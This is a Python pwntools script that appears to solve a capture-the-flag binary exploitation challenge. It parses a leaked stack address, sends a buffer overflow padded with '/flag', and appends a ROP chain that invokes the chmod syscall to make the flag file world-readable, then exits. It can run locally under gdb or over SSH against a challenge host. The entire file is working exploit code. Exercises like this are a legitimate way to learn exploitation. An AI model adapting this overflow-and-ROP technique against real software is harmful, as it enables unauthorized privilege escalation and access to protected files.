#!/usr/bin/env python

from pwn import *

context.arch = "x86_64"

get_flag = False
chall_name = '4.1'

def get_stack_leaked_address(p_output):
    initial_position = p_output.find('0x')
    final_position = p_output.find('.\n\n')
    stack_leak = p_output[initial_position:final_position]
    print('p_output:')
    print(p_output)
    print('stack:')
    print(stack_leak)
    return int(stack_leak, 16)

def run_with_gdb(p):
    gdb.attach(p,'''
    b *challenge+396''')

def run_exploit(p, debug, chall_path):
    if debug:
        run_with_gdb(p)
            
    process_output = p.recv(timeout=2).decode()
    stack_leak = get_stack_leaked_address(process_output)
    print(hex(stack_leak))

    # chmod("/flag", 0777)
    sys_chmod_code = p64(0x5A) # sys_chmod
    chmod = p64(0x1FF) # 0777

    # exit(trash)
    exit_syscall = p64(0x3C)
    
    # mouting rop chain
    rop = ROP(chall_path)
    # rax = syscall_code, rdi = address of file name, rsi = chmod octal value to set
    rop.raw(rop.rax.address)
    rop.raw(sys_chmod_code)

    rop.raw(rop.rdi.address)
    rop.raw(p64(stack_leak))

    rop.raw(rop.rsi.address)
    rop.raw(chmod)
    rop.raw(rop.syscall.address)
    
    rop.raw(rop.rax.address)
    rop.raw(exit_syscall)
    rop.raw(rop.syscall.address)
    print(rop.dump())

    overflow = cyclic(400, n=8)
    overflow_until_ret = b'/flag\x00' + (b'A' * (cyclic_find('haaaaaaa', n=8)-6) )
    #p.send(overflow)
    p.send(overflow_until_ret + rop.chain())

    p.interactive()

if get_flag:
    ssh_connection = ssh(host='college',user='hacker')
    ssh_connection.set_working_directory(b'/challenge/')

    process_full_path = '/challenge/' + chall_name
    p = ssh_connection.run(process_full_path)

    run_exploit(p, False, chall_name)
    ssh_connection.close()
else:
    process_full_path = './' + chall_name
    p = process(process_full_path)
    run_exploit(p, True, process_full_path)
